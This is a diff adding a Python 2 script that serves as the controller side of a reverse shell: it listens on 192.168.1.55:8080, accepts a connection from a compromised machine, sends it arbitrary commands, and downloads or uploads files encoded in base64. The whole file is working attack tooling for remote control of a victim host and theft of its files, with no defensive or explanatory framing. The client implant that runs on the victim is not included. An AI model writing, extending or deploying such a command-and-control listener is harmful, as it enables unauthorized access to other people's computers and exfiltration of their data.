@@ -1,0 +1,88 @@
+#!/usr/bin/python
+
+""" Import """
+import socket
+import json
+import os
+import base64
+from termcolor import colored
+from colored import fg, attr
+
+
+def sent(data):
+    """ Send data """
+    json_data = json.dumps(data)
+    target.send(json_data)
+
+
+def recvd():
+    """ Receive data """
+    data = ""
+    while True:
+        try:
+            data = data + target.recv(1024)
+            return json.loads(data)
+        except ValueError:
+            continue
+
+
+def shell():
+    """ Shell """
+    so = recvd()
+    path = "%s{}%s@%s{}%s# ".format(so,
+           str(ip[0])) %(fg(1), attr(0), fg(4),attr(0))
+    while True:
+        cmd = raw_input(path)
+        sent(cmd)
+        if cmd == 'exit':
+            break
+        elif cmd[:2] == "cd" and len(cmd) > 1:
+            continue
+        elif cmd[:4] == 'curr':
+            curr = recvd()
+            print(curr)
+        elif cmd[:8] == "download":
+            with open(cmd[9:], 'wb') as down_file:
+                file_data = recvd()
+                down_file.write(base64.b64decode(file_data))
+        elif cmd[:6] == "upload":
+            try:
+                with open(cmd[7:], "rb") as up_file:
+                    sent(base64.b64encode(up_file.read()))
+            except:
+                failed = "Failed to Upload."
+                sent(base64.b64encode(failed))
+        else:
+            result = recvd()
+            print(colored(result, 'green'))
+
+
+def connection():
+    """ Create a connection """
+    global conn
+    global ip
+    global target
+    """ Create socket """
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    """ Address to bind """
+    conn.bind(("192.168.1.55", 8080))
+    """ Waiting for connection """
+    conn.listen(5)
+    print("%s[+] Listening for Incommig Connections...%s" %(fg(3), attr(0)))
+    """ Accpet connection """
+    target, ip = conn.accept()
+    """ Message of Connection Information """
+    print("%s[+] Connection established from: %s" %(fg(3), attr(0)))
+    print("%s[+] Address: {}\n[+] port: {}%s".format(str(ip[0]),
+          str(ip[1])) %(fg(3), attr(0)))
+    msg_conn = recvd()
+    print(colored(msg_conn, 'green'))
+    """ Call shell """
+    shell()
+    """ Close connection """
+    conn.close()
+
+
+if __name__ == '__main__':
+    connection()
